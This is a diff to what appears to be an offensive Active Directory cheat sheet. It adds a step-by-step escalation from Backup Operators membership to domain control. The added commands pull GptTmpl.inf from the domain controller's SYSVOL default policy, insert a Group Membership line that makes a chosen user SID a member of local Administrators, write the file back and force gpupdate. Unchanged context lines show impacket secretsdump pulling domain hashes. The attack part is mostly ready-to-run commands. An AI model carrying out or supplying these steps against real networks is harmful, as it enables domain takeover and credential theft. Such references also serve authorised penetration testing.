@@ -300,6 +300,7 @@ Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbos
 Get-DomainGroupMember "Backup Operators" | Select-Object Membername
 ```
 
+### BackupOperatorToDa.exe
 #### Host a public SMB share
 ```
 python3 /opt/impacket/examples/smbserver.py share <DIRECTORY FOR SHARE> -smb2support
@@ -321,6 +322,54 @@ secretsdump.py LOCAL -system <DIRECTORY FOR SHARE>/SYSTEM -security <DIRECTORY F
 ```
 secretsdump.py '<DOMAIN>/<DC COMPUTERACCONT NAME>$'@<DC FQDN> -hashes <LM HASH>:<NTLM HASH>
 ```
+
+### GptTmpl.inf
+- Requires to be run from high priv shell on machine within the domain, as the context of the backup operator account.
+
+#### Download GptTmpl.inf
+- Downloads to `C:\users\public\GptTmpl.inf`
+```
+robocopy "\\<FQDN DC>\sysvol\<DOMAIN>\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit" "C:\users\public"  GptTmpl.inf /b
+```
+
+#### Get user sid
+- This sid wil get added to the local admins group
+```
+Get-DomainUser | Select-Object samaccountname, objectsid
+```
+
+#### Edit GptTmpl.inf
+- Add the following inbetween `[Version]` and `[Privilege Rights]`
+```
+[Group Membership]
+*<SID>__Memberof = *S-1-5-32-544
+*<SID>__Members =
+```
+
+Example:
+```
+...snip...
+[Version]
+signature="$CHICAGO$"
+Revision=1
+[Group Membership]
+*S-1-5-21-997099906-443949041-4154774969-1121__Memberof = *S-1-5-32-544
+*S-1-5-21-997099906-443949041-4154774969-1121__Members =
+[Privilege Rights]
+...snip...
+```
+
+#### Upload GptTmpl.inf
+```
+robocopy "C:\users\public" "\\<FQDN DC>\sysvol\<DOMAIN>\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit" GptTmpl.inf /b
+```
+
+#### Wait for gpupdate
+```
+gpupdate /force
+```
+
+
 
 ### Account Operators
 The group grants limited account creation privileges to a user. Members of this group can create and modify most types of accounts, including those of users, local groups, and global groups, and members can log in locally to domain controllers. By default it has no direct path to Domain Admin, but these groups might be able to add members to other groups which have other ACL's etc.
